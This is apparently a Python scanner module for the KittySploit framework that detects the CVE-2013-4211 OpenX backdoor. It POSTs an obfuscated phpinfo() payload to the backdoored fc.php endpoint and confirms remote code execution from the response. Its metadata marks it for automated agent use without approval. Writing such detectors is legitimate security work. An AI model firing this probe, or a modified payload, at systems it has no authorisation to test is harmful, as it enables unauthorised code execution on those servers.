#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OpenX flowplayer backdoor phpinfo (CVE-2013-4211)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenX - flowplayer Backdoor Detection (CVE-2013-4211)',
        'description': (
            'Detects CVE-2013-4211 by POSTing encoded phpinfo payload to '
            'fc.php flowplayer deliveryLog endpoint.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'openx', 'backdoor', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-4211',
        ],
        'cve': 'CVE-2013-4211',
    }

    def run(self):
        # phpinfo(); | reverse | rot13 | urlencode
        data = 'vastPlayer=%3B%29%28bsavcuc'
        for base in ('', '/openx', '/www'):
            path = (
                f'{base}/www/delivery/fc.php?file_to_serve=flowplayer/3.1.1/'
                'flowplayer-3.1.1.min.js&script=deliveryLog:vastServeVideoPlayer:player'
            )
            r = self.http_request(
                method='POST',
                path=path,
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and '<title>phpinfo()' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='OpenX flowplayer backdoor (CVE-2013-4211)',
                    path=f'{base}/www/delivery/fc.php',
                )
                return True
        return False
